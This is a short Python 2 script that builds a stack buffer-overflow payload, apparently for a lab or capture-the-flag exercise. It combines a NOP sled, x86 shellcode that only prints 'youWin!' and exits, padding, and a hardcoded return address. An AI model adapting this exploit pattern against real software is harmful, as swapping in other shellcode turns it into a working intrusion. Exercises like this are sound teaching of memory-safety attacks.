code = '\xeb\x13\x59\x31\xc0\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x08\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe8\xff\xff\xff\x79\x6f\x75\x57\x69\x6e\x21'
ret_addr = '\x70\xeb\xff\xbf'
exit_addr = '\xc4\x7b\xec\xb7'

print '\x90'*40 + code + 'A'*191 + ret_addr + ret_addr
